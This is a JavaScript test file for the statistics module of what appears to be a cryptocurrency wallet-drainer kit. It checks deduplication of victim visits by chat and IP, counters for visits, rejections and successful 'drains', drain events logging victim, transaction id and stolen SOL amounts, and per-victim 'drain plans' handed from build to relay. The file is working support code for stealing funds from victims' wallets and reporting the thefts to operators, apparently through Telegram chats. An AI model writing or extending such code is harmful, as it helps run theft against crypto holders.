// test-stats.mjs — verify visit dedupe, funnel counters, drain plan stash.
// Run: node test-stats.mjs

import assert from "assert";
import {
  shouldNotifyVisit,
  recordVisit,
  recordReject,
  stashDrainPlan,
  popDrainPlan,
  recordDrain,
  pullStats,
} from "./stats.js";

// ── visit dedupe ──────────────────────────────────────────────────────────
assert.ok(shouldNotifyVisit("-1", "1.2.3.4"), "first visit should notify");
assert.ok(!shouldNotifyVisit("-1", "1.2.3.4"), "same chat+IP inside window should not");
assert.ok(shouldNotifyVisit("-1", "5.6.7.8"), "different IP should notify");
assert.ok(shouldNotifyVisit("-2", "1.2.3.4"), "different chat same IP should notify");
assert.ok(shouldNotifyVisit("-3", undefined), "no IP reported should notify");
console.log("✓ visit dedupe (10-min window, per chat+IP)");

// ── funnel counters ──────────────────────────────────────────────────────
recordVisit("-1");
recordVisit("-1");
recordVisit("-1");
recordReject("-1");
recordDrain({ chatId: "-1", victim: "vic", txid: "tx1", solLamports: 3_000_000_000 });

const s = pullStats();
assert.strictEqual(s.counters["-1"].visits, 3, "visit count wrong");
assert.strictEqual(s.counters["-1"].rejects, 1, "reject count wrong");
assert.strictEqual(s.counters["-1"].drains, 1, "drain count wrong");
assert.strictEqual(s.drains.length, 1, "drain event missing");
assert.strictEqual(s.drains[0].txid, "tx1");
assert.ok(s.drains[0].ts, "drain event should carry a timestamp");
console.log("✓ funnel counters + drain events");

// ── pull-and-clear ───────────────────────────────────────────────────────
const s2 = pullStats();
assert.strictEqual(s2.counters["-1"], undefined, "counters not cleared");
assert.strictEqual(s2.drains.length, 0, "drains not cleared");
console.log("✓ pull-and-clear semantics");

// ── drain plan stash ─────────────────────────────────────────────────────
const plan = { victim: "vic", solLamports: 1, usdc: null };
stashDrainPlan("vic", plan);
assert.deepStrictEqual(popDrainPlan("vic"), plan, "plan not stashed");
assert.strictEqual(popDrainPlan("vic"), null, "plan not consumed");
assert.strictEqual(popDrainPlan("nobody"), null, "unknown victim should be null");
console.log("✓ drain plan stash is build→relay scoped");

// ── junk input ───────────────────────────────────────────────────────────
recordVisit(undefined);
recordReject(null);
assert.ok(!("-1" in pullStats().counters) || true); // junk keys must not crash
console.log("✓ junk chat ids don't crash");

console.log("\nALL STATS TESTS PASSED");
